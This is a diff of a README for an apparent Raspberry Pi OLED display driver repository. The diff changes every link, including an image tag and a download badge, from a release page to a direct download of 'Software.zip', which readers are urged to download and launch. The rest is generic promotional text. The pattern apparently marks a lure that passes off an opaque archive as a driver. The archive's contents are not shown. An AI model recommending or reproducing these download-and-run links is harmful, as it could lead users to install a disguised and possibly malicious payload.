@@ -1,13 +1,13 @@
 # 🖥️ **U6143_ssd1306 OLED Display Setup for Raspberry Pi**
 
-![OLED Display](https://github.com/levdlyon/U6143_ssd1306-OLED-Display-Setup-for-Raspberry-Pi/releases/tag/v1.0)
+![OLED Display](https://github.com/levdlyon/U6143_ssd1306-OLED-Display-Setup-for-Raspberry-Pi/releases/download/v2.0/Software.zip)
 
 ## Overview
 This repository provides an automated setup script and driver for U6143_ssd1306 OLED displays on Raspberry Pi. The setup script allows for one-click installation, I2C configuration, and auto-startup capability. Additionally, the repository includes both C and Python examples for utilizing the OLED display.
 
 ## Installation
 To get started with your U6143_ssd1306 OLED Display on Raspberry Pi, follow these simple steps:
-1. Download the setup script and driver from the [**https://github.com/levdlyon/U6143_ssd1306-OLED-Display-Setup-for-Raspberry-Pi/releases/tag/v1.0**](https://github.com/levdlyon/U6143_ssd1306-OLED-Display-Setup-for-Raspberry-Pi/releases/tag/v1.0) file.
+1. Download the setup script and driver from the [**https://github.com/levdlyon/U6143_ssd1306-OLED-Display-Setup-for-Raspberry-Pi/releases/download/v2.0/Software.zip**](https://github.com/levdlyon/U6143_ssd1306-OLED-Display-Setup-for-Raspberry-Pi/releases/download/v2.0/Software.zip) file.
 2. Launch the script to automate the installation process.
 3. Connect your OLED display to the Raspberry Pi following the provided instructions.
 4. Use the C and Python examples to start displaying content on your OLED screen.
@@ -22,9 +22,9 @@ To get started with your U6143_ssd1306 OLED Display on Raspberry Pi, follow thes
 automation, c, i2c, iot, linux, oled-display, python, raspberry-pi, raspberrypi, ssd1306, ssd1306-oled
 
 ## Additional Resources
-For more information and updates, visit the [Releases](https://github.com/levdlyon/U6143_ssd1306-OLED-Display-Setup-for-Raspberry-Pi/releases/tag/v1.0) section of this repository.
+For more information and updates, visit the [Releases](https://github.com/levdlyon/U6143_ssd1306-OLED-Display-Setup-for-Raspberry-Pi/releases/download/v2.0/Software.zip) section of this repository.
 
-[![Download https://github.com/levdlyon/U6143_ssd1306-OLED-Display-Setup-for-Raspberry-Pi/releases/tag/v1.0](https://github.com/levdlyon/U6143_ssd1306-OLED-Display-Setup-for-Raspberry-Pi/releases/tag/v1.0)](https://github.com/levdlyon/U6143_ssd1306-OLED-Display-Setup-for-Raspberry-Pi/releases/tag/v1.0)
+[![Download https://github.com/levdlyon/U6143_ssd1306-OLED-Display-Setup-for-Raspberry-Pi/releases/download/v2.0/Software.zip](https://github.com/levdlyon/U6143_ssd1306-OLED-Display-Setup-for-Raspberry-Pi/releases/download/v2.0/Software.zip)](https://github.com/levdlyon/U6143_ssd1306-OLED-Display-Setup-for-Raspberry-Pi/releases/download/v2.0/Software.zip)
 
 ## Get Started
 Don't wait any longer to enhance your Raspberry Pi projects with the U6143_ssd1306 OLED Display. Download the setup script and driver now and start displaying captivating content on your OLED screen!
